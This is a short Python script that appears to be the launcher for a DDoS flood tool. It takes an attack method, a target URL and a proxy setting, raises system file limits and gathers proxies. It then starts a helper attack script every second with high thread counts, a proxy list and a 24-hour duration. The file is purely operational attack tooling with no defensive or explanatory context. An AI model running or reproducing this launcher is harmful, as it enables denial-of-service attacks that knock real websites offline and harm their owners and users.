import os
import sys
import requests
import time
import schedule

method = sys.argv[1]
url = sys.argv[2]
proxy = sys.argv[3]

os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
os.system('python3 ./files/proxy.py {} >/dev/null 2>&1'.format(url))

def job():
    os.system('python3 files.py {} {} {} 1000 http.txt 1000000 86400'.format(method, url, proxy))

schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)